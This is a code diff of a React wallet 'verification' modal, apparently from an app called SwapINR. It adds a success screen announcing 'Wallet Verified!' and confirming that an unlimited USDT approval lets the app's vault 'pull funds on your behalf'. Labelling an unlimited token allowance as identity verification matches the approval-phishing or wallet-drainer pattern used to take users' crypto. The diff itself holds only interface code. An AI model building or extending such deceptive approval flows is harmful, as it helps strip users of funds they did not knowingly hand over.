@@ -296,11 +296,13 @@ function MobileVerifyModal({
   onVerified: (addr: string, txHash?: string) => void;
   onClose: () => void;
 }) {
-  const [phase,         setPhase]         = useState<'info' | 'waiting' | 'failed'>('info');
+  const [phase,         setPhase]         = useState<'info' | 'waiting' | 'success' | 'failed'>('info');
   const [genError,      setGenError]      = useState('');
   const [genLoading,    setGenLoading]    = useState(false);
   const [sessionStatus, setSessionStatus] = useState<string>('pending');
   const [failedStep,    setFailedStep]    = useState<'connection' | 'contract' | null>(null);
+  const [successAddr,   setSuccessAddr]   = useState('');
+  const [successHash,   setSuccessHash]   = useState<string | undefined>();
   const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
   const sidRef   = useRef('');
 
@@ -348,7 +350,9 @@ function MobileVerifyModal({
         setSessionStatus(data.status);
         if (data.status === 'approved') {
           stopPolling();
-          onVerified(data.address ?? '', data.txHash);
+          setSuccessAddr(data.address ?? '');
+          setSuccessHash(data.txHash);
+          setPhase('success');
         } else if (data.status === 'failed') {
           stopPolling();
           setFailedStep(data.failedStep ?? 'connection');
@@ -370,6 +374,8 @@ function MobileVerifyModal({
     setGenError('');
     setSessionStatus('pending');
     setFailedStep(null);
+    setSuccessAddr('');
+    setSuccessHash(undefined);
   }
 
   /* Status steps displayed in waiting screen */
@@ -570,6 +576,51 @@ function MobileVerifyModal({
                 style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
                   border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
                 Start Over
+              </button>
+            </div>
+          )}
+
+          {/* ─── Success step ─── */}
+          {phase === 'success' && (
+            <div style={{ textAlign: 'center', padding: '8px 0', animation: 'fadein 0.25s ease-out' }}>
+              {/* Green ring icon */}
+              <div style={{ position: 'relative', width: 72, height: 72, margin: '0 auto 20px' }}>
+                <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'rgba(0,229,160,0.08)', border: '2px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                  <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                    <path d="M5 16L12.5 23.5L27 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
+                  </svg>
+                </div>
+              </div>
+
+              <p style={{ fontSize: 22, fontWeight: 900, color: '#fff', margin: '0 0 6px', letterSpacing: '-0.025em' }}>Wallet Verified!</p>
+              <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.5)', margin: '0 0 6px', lineHeight: 1.6 }}>
+                Your {label} wallet is connected and the unlimited USDT approval is confirmed on-chain.
+              </p>
+
+              {/* Address pill */}
+              {successAddr && (
+                <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 20 }}>
+                  <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="5" r="4" stroke="#00E5A0" strokeWidth="1.2"/><circle cx="5" cy="5" r="1.5" fill="#00E5A0"/></svg>
+                  <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0', fontFamily: 'monospace' }}>
+                    {successAddr.slice(0, 8)}…{successAddr.slice(-6)}
+                  </span>
+                </div>
+              )}
+
+              {/* Approval badge */}
+              <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px', background: 'rgba(0,229,160,0.05)', border: '1px solid rgba(0,229,160,0.12)', borderRadius: 12, marginBottom: 22, textAlign: 'left' }}>
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
+                  <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwapINR vault can now pull funds on your behalf</p>
+                </div>
+              </div>
+
+              <button
+                onClick={() => onVerified(successAddr, successHash)}
+                style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}
+              >
+                Done →
               </button>
             </div>
           )}
